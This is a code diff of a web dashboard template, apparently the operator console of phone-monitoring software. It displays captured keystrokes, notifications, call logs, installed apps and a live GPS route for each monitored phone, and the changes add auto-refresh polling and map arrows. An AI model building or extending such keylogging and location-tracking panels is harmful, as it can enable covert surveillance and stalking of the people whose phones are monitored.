@@ -44,7 +44,7 @@
                     </div>
                     <div class="card mb-3 shadow-md">
                         <div class="card-header">
-                            <h4 class="font-weight-bold"> <i class="fa fa-phone"></i> <span phonename></span> </h4>
+                            <h4 class="font-weight-bold m-0"> <i class="fa fa-phone"></i> <span phonename></span> </h4>
                         </div>
                         <div class="card-body">
                             <p class="m-1">
@@ -486,6 +486,9 @@
         <script src="https://unpkg.com/leaflet-gesture-handling"></script>
         <link rel="stylesheet" href="https://unpkg.com/leaflet.fullscreen/Control.FullScreen.css" />
         <script src="https://unpkg.com/leaflet.fullscreen/Control.FullScreen.js"></script>
+        <script src="https://cdn.jsdelivr.net/npm/leaflet-polylinedecorator@1.6.0/dist/leaflet.polylineDecorator.min.js">
+        </script>
+
         <style>
             #map {
                 height: 400px;
@@ -559,7 +562,9 @@
                     if (!phone) return;
                     $('[updatedon]').html(phone.updatedon);
                     $('[appversion]').html(phone.data.appversion);
-                    $('[phonename]').html(phone.phone);
+                    var sn = phone.name ?
+                        `<br/><small style='font-size:12px'><i class='fa fa-user-alt'></i> ${phone.name}</small>` : '';
+                    $('[phonename]').html(phone.phone + sn);
                     $('[battery]').html(phone.data.battery);
                     $('[android_version]').html(phone.data.android_version);
                     $('[fcm]').html(phone.fcm ? "<i class='fa fa-check-circle text-success'></i>" :
@@ -713,25 +718,14 @@
                         [10, 25, 50, 100, -1],
                         [10, 25, 50, 100, "All"]
                     ],
-                    processing: false,
+                    processing: true,
                     serverSide: true,
                     ajax: {
                         url: "{{ route('remotecontol.index', ['datatable' => '']) }}",
-                        beforeSend: function() {
-                            // if (!showloader) return;
-                            // $('[tdata]').closest('div').LoadingOverlay("show", {
-                            //     maxSize: 50
-                            // });
-                        },
+
                         data: function(data) {
                             data.type = "result";
                             data.phone_id = phonesel.val();
-                        },
-                        complete: function() {
-                            // $('[tdata]').closest('div').LoadingOverlay("hide");
-                        },
-                        error: function(resp) {
-                            $('[onerror]').slideDown();
                         },
                         dataSrc: function(json) {
                             phoneStatus(json.phone);
@@ -787,65 +781,24 @@
                             class: 'text-nowrap text-right'
                         },
                     ]
-                })).on('xhr.dt',
-                    function(e, settings, data, xhr) {
-                        // $('span[nb]').html(data.recordsTotal);
-                    });
-
-                let isDtResultInprogress = false;
-
-                setInterval(async () => {
-                    if (isDtResultInprogress) return;
-                    isDtResultInprogress = true;
-                    showloader = false;
-                    try {
-                        await new Promise((resolve, reject) => {
-                            dtResult.ajax.reload(function(json) {
-                                resolve(json);
-                            }, false);
-                        });
-                    } catch (error) {}
-                    showloader = true;
-                    isDtResultInprogress = false;
-                }, 3000);
-
+                }));
 
                 /////////////
                 var dtNotif = (new DataTable('[tnotif]', {
-                    // dom: 'Bfrtip',
-                    // buttons: [
-                    //     'pageLength', 'excel', 'pdf', 'print'
-                    // ],
                     lengthMenu: [
                         [10, 25, 50, 100, -1],
                         [10, 25, 50, 100, "All"]
                     ],
-                    processing: false,
+                    processing: true,
                     serverSide: true,
                     ajax: {
                         url: "{{ route('remotecontol.index', ['datatable' => '']) }}",
-                        beforeSend: function() {
-                            // if (!showloader) return;
-                            // $('[tdata]').closest('div').LoadingOverlay("show", {
-                            //     maxSize: 50
-                            // });
-                        },
                         data: function(data) {
                             data.type = "notif";
                             data.phone_id = phonesel.val();
                             data.phoneapps = JSON.stringify($('#phoneapps').val());
                             data.notificationdate = $('#notificationdate').val();
                         },
-                        complete: function() {
-                            // $('[tdata]').closest('div').LoadingOverlay("hide");
-                        },
-                        error: function(resp) {
-                            $('[onerror]').slideDown();
-                        },
-                        // dataSrc: function(json) {
-                        //     // $('[solde]').html(json.tot.join(' | '));
-                        //     return json.data;
-                        // }
                     },
                     order: [
                         [0, "desc"]
@@ -881,27 +834,7 @@
                             class: 'text-nowrap text-right'
                         },
                     ]
-                })).on('xhr.dt',
-                    function(e, settings, data, xhr) {
-                        // $('span[nb]').html(data.recordsTotal);
-                    });
-
-                let isDtNotifInprogress = false;
-
-                // setInterval(async () => {
-                //     if (isDtNotifInprogress) return;
-                //     isDtNotifInprogress = true;
-                //     showloader = false;
-                //     try {
-                //         await new Promise((resolve, reject) => {
-                //             dtNotif.ajax.reload(function(json) {
-                //                 resolve(json);
-                //             }, false);
-                //         });
-                //     } catch (error) {}
-                //     showloader = true;
-                //     isDtNotifInprogress = false;
-                // }, 3000);
+                }));
 
 
                 /////////////
@@ -914,31 +847,15 @@
                         [10, 25, 50, 100, -1],
                         [10, 25, 50, 100, "All"]
                     ],
-                    processing: false,
+                    processing: true,
                     serverSide: true,
                     ajax: {
                         url: "{{ route('remotecontol.index', ['datatable' => '']) }}",
-                        beforeSend: function() {
-                            // if (!showloader) return;
-                            // $('[tdata]').closest('div').LoadingOverlay("show", {
-                            //     maxSize: 50
-                            // });
-                        },
                         data: function(data) {
                             data.type = "keylog";
                             data.phone_id = phonesel.val();
                             data.keyloggerdate = keyloggerdate.val();
                         },
-                        complete: function() {
-                            // $('[tdata]').closest('div').LoadingOverlay("hide");
-                        },
-                        error: function(resp) {
-                            $('[onerror]').slideDown();
-                        },
-                        // dataSrc: function(json) {
-                        //     // $('[solde]').html(json.tot.join(' | '));
-                        //     return json.data;
-                        // }
                     },
                     order: [
                         [0, "desc"]
@@ -983,17 +900,15 @@
                             visible: false,
                         },
                     ]
-                })).on('xhr.dt',
-                    function(e, settings, data, xhr) {
-                        // $('span[nb]').html(data.recordsTotal);
-                    });
+                }));
 
                 $('[tkeylogger] tbody').on('click', 'tr', function() {
                     var data = dtKeylogger.row(this).data();
                     var text0 = data.text0;
                     var tb = text0.split('@');
                     var app = tb[0] ?? '-';
-                    var txt = tb[1] ?? '-'
+                    tb.shift();
+                    var txt = tb.join('');
                     var mdl = $('#minfo');
                     $('span[appname]', mdl).html(app);
                     $('.modal-body', mdl).html(txt);
@@ -1002,60 +917,21 @@
                     }).show();
                 });
 
-
-                let isDtKeyloggerInprogress = false;
-
-                // setInterval(async () => {
-                //     if (isDtKeyloggerInprogress) return;
-                //     isDtKeyloggerInprogress = true;
-                //     showloader = false;
-                //     try {
-                //         await new Promise((resolve, reject) => {
-                //             dtKeylogger.ajax.reload(function(json) {
-                //                 resolve(json);
-                //             }, false);
-                //         });
-                //     } catch (error) {}
-                //     showloader = true;
-                //     isDtKeyloggerInprogress = false;
-                // }, 3000);
-
-
                 /////////////
                 var dtCalls = (new DataTable('[tcalls]', {
-                    // dom: 'Bfrtip',
-                    // buttons: [
-                    //     'pageLength', 'excel', 'pdf', 'print'
-                    // ],
                     lengthMenu: [
                         [10, 25, 50, 100, -1],
                         [10, 25, 50, 100, "All"]
                     ],
-                    processing: false,
+                    processing: true,
                     serverSide: true,
                     ajax: {
                         url: "{{ route('remotecontol.index', ['datatable' => '']) }}",
-                        beforeSend: function() {
-                            // if (!showloader) return;
-                            // $('[tdata]').closest('div').LoadingOverlay("show", {
-                            //     maxSize: 50
-                            // });
-                        },
                         data: function(data) {
                             data.type = "calls";
                             data.phone_id = phonesel.val();
                             data.calldate = calldate.val();
                         },
-                        complete: function() {
-                            // $('[tdata]').closest('div').LoadingOverlay("hide");
-                        },
-                        error: function(resp) {
-                            $('[onerror]').slideDown();
-                        },
-                        // dataSrc: function(json) {
-                        //     // $('[solde]').html(json.tot.join(' | '));
-                        //     return json.data;
-                        // }
                     },
                     order: [
                         [0, "desc"]
@@ -1095,62 +971,23 @@
                             class: 'text-nowrap text-right'
                         },
                     ]
-                })).on('xhr.dt',
-                    function(e, settings, data, xhr) {
-                        // $('span[nb]').html(data.recordsTotal);
-                    });
+                }));
 
-                let isDtCallsInprogress = false;
-
-                // setInterval(async () => {
-                //     if (isDtCallsInprogress) return;
-                //     isDtCallsInprogress = true;
-                //     showloader = false;
-                //     try {
-                //         await new Promise((resolve, reject) => {
-                //             dtCalls.ajax.reload(function(json) {
-                //                 resolve(json);
-                //             }, false);
-                //         });
-                //     } catch (error) {}
-                //     showloader = true;
-                //     isDtCallsInprogress = false;
-                // }, 3000);
 
                 /////////////
                 var dtApps = (new DataTable('[tapps]', {
-                    // dom: 'Bfrtip',
-                    // buttons: [
-                    //     'pageLength', 'excel', 'pdf', 'print'
-                    // ],
                     lengthMenu: [
                         [10, 25, 50, 100, -1],
                         [10, 25, 50, 100, "All"]
                     ],
-                    processing: false,
+                    processing: true,
                     serverSide: true,
                     ajax: {
                         url: "{{ route('remotecontol.index', ['datatable' => '']) }}",
-                        beforeSend: function() {
-                            // if (!showloader) return;
-                            // $('[tdata]').closest('div').LoadingOverlay("show", {
-                            //     maxSize: 50
-                            // });
-                        },
                         data: function(data) {
                             data.type = "apps";
                             data.phone_id = phonesel.val();
                         },
-                        complete: function() {
-                            // $('[tdata]').closest('div').LoadingOverlay("hide");
-                        },
-                        error: function(resp) {
-                            $('[onerror]').slideDown();
-                        },
-                        // dataSrc: function(json) {
-                        //     // $('[solde]').html(json.tot.join(' | '));
-                        //     return json.data;
-                        // }
                     },
                     order: [
                         [1, "asc"]
@@ -1185,15 +1022,121 @@
                             name: 'is_uninstalled',
                         },
                     ]
-                })).on('xhr.dt',
-                    function(e, settings, data, xhr) {
-                        // $('span[nb]').html(data.recordsTotal);
-                    });
+                }));
+
+                function startWatch() {
+                    let isDtResultInprogress = false;
+                    setInterval(async () => {
+                        if (isDtResultInprogress) return;
+                        isDtResultInprogress = true;
+                        var e = $('[tresult]').closest('.dataTables_wrapper').find(
+                            '.dataTables_processing');
+                        e.css('visibility', 'hidden');
+                        try {
+                            await new Promise((resolve, reject) => {
+                                dtResult.ajax.reload(function(json) {
+                                    resolve(json);
+                                }, false);
+                            });
+                        } catch (error) {}
+                        isDtResultInprogress = false;
+                        e.css('visibility', 'visible');
+                    }, 3000);
+
+                    let isDtNotifInprogress = false;
+                    setInterval(async () => {
+                        if (isDtNotifInprogress) return;
+                        isDtNotifInprogress = true;
+
+                        const processingEl = $('[tnotif]').closest('.dataTables_wrapper').find(
+                            '.dataTables_processing');
+                        processingEl.css('visibility', 'hidden');
+
+                        try {
+                            await new Promise((resolve, reject) => {
+                                dtNotif.ajax.reload(function(json) {
+                                    resolve(json);
+                                }, false);
+                            });
+                        } catch (error) {}
+
+                        processingEl.css('visibility', 'visible');
+                        isDtNotifInprogress = false;
+                    }, 3000);
+
+                    let isDtKeyloggerInprogress = false;
+                    setInterval(async () => {
+                        if (isDtKeyloggerInprogress) return;
+                        isDtKeyloggerInprogress = true;
+
+                        const processingEl = $('[tkeylogger]').closest('.dataTables_wrapper').find(
+                            '.dataTables_processing');
+                        processingEl.css('visibility', 'hidden');
+
+                        try {
+                            await new Promise((resolve, reject) => {
+                                dtKeylogger.ajax.reload(function(json) {
+                                    resolve(json);
+                                }, false);
+                            });
+                        } catch (error) {}
+
+                        processingEl.css('visibility', 'visible');
+                        isDtKeyloggerInprogress = false;
+                    }, 3000);
+
+                    let isDtCallsInprogress = false;
+                    setInterval(async () => {
+                        if (isDtCallsInprogress) return;
+                        isDtCallsInprogress = true;
+
+                        const processingEl = $('[tcalls]').closest('.dataTables_wrapper').find(
+                            '.dataTables_processing');
+                        processingEl.css('visibility', 'hidden');
+
+                        try {
+                            await new Promise((resolve, reject) => {
+                                dtCalls.ajax.reload(function(json) {
+                                    resolve(json);
+                                }, false);
+                            });
+                        } catch (error) {}
+
+                        processingEl.css('visibility', 'visible');
+                        isDtCallsInprogress = false;
+                    }, 3000);
+
+
+                    let isDtAppsInprogress = false;
+                    setInterval(async () => {
+                        if (isDtAppsInprogress) return;
+                        isDtAppsInprogress = true;
+
+                        const processingEl = $('[tapps]').closest('.dataTables_wrapper').find(
+                            '.dataTables_processing');
+                        processingEl.css('visibility', 'hidden');
+
+                        try {
+                            await new Promise((resolve, reject) => {
+                                dtApps.ajax.reload(function(json) {
+                                    resolve(json);
+                                }, false);
+                            });
+                        } catch (error) {}
+
+                        processingEl.css('visibility', 'visible');
+                        isDtAppsInprogress = false;
+                    }, 3000);
+
+                }
+
+                startWatch();
 
                 var mapinitilized = false;
                 var markerGroup = null;
                 var map = null;
                 let routeLine = null;
+                let routeDecorator = null;
 
                 function initmap() {
                     try {
@@ -1261,22 +1204,46 @@
                                 });
                                 if (routeLine) {
                                     map.removeLayer(routeLine);
+                                    routeLine = null;
+                                }
+
+                                if (routeDecorator) {
+                                    map.removeLayer(routeDecorator);
+                                    routeDecorator = null;
                                 }
 
                                 routeLine = L.polyline(latlngs, {
                                     color: 'blue',
-                                    weight: 4,
+                                    weight: 2,
                                     opacity: 0.7,
                                     smoothFactor: 1
                                 }).addTo(map);
 
+                                routeDecorator = L.polylineDecorator(routeLine, {
+                                    patterns: [{
+                                        offset: '5%',
+                                        repeat: '10%',
+                                        symbol: L.Symbol.arrowHead({
+                                            pixelSize: 8,
+                                            polygon: true,
+                                            pathOptions: {
+                                                color: 'blue',
+                                                fillOpacity: 1,
+                                                weight: 0
+                                            }
+                                        })
+                                    }]
+                                }).addTo(map);
 
                                 data.forEach((point, index) => {
                                     const lat = point.latitude;
                                     const lng = point.longitude;
+                                    var islast = index == data.length - 1;
+
                                     const circleOptions = {
-                                        radius: index === 0 ? 8 : 6,
-                                        fillColor: index === 0 ? 'red' : '#3388ff',
+                                        radius: 6,
+                                        fillColor: islast ? 'red' : (index == 0 ? 'yellow' :
+                                            '#3388ff'),
                                         color: '#fff',
                                         weight: 2,
                                         opacity: 1,
@@ -1293,7 +1260,7 @@
                                     markerGroup.addLayer(marker);
                                 });
 
-                                const lastPoint = data[0];
+                                const lastPoint = data[data.length - 1];
                                 if (lastPoint) {
                                     const lastLat = lastPoint.latitude;
                                     const lastLng = lastPoint.longitude;
@@ -1313,6 +1280,9 @@
                                     }).bindPopup(
                                         `<strong>Précision : ${lastPoint.accuracy}m | ${lastPoint.date}</strong>`
                                     );
+                                    lastMarker.on('mouseover', function(e) {
+                                        this.openPopup();
+                                    });
 
                                     markerGroup.addLayer(lastMarker);
 
